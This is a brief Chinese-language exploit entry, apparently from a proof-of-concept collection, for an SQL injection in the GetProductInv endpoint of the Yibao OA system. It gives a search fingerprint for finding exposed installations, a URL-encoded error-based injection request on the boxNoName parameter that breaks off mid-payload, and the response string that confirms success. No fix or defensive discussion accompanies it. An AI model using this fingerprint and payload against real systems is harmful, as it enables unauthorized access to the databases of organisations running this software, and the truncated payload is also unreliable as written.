# 易宝OAGetProductInv接口SQL注入漏洞

易宝OAGetProductInv接口 ｜ SQL注入 ｜ —
- **指纹**：`app="顶讯科技-易宝OA系统"`
- **请求**：`GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(`
- **响应特征**：200 qbppqlqxzzq